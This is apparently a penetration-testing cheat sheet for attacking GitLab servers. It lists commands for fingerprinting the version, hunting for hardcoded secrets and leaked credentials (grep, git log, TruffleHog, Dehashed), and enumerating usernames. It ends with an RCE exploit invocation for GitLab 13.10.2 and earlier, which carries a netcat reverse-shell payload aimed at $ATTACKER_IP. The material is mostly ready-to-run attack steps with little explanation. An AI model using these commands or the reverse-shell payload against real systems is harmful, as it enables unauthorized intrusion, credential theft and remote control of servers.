
- Login Page: `http://gitlab.$VICTIM_IP/users/sign_in`
- Version Check: `curl -s http://gitlab.$VICTIM_IP/help | grep -oP 'GitLab \K[\d.]+'`
- Search for hardcoded credentials, API keys, or SSH keys in commits.
- Try registering with common usernames `admin`, `root`, `gitlab`
- Search for secrets `grep -r "password\|api_key\|secret" .`
- Always check /explore for public repos
- Search commits for secrets (git log -p)
- Find leaked creds (e.g., from Dehashed) `python3 dehashed.py -q $DOMAIN -p`
- Combine with TruffleHog to scan repos for secrets! `trufflehog git http://gitlab.$VICTIM_IP/root/repo.git
`

#### <span style="color:#FFB86C">Username Enumeration</span>
```
./gitlab_userenum.sh --url http://gitlab.$VICTIM_IP:8081/ --userlist users.txt
```

### <span style="color:#50FA7B">Exploitation (RCE in GitLab ≤ 13.10.2)</span>
#### <span style="color:#FFB86C">Prerequisites</span>
- Valid credentials (or self-registration if allowed).
- Vulnerable version (≤ 13.10.2).
#### <span style="color:#FFB86C">Use Exploit Script:</span>
```bash
python3 gitlab_13_10_2_rce.py -t http://gitlab.$VICTIM_IP:8081 -u $USER -p $PASS -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $ATTACKER_IP 8443 >/tmp/f'
```
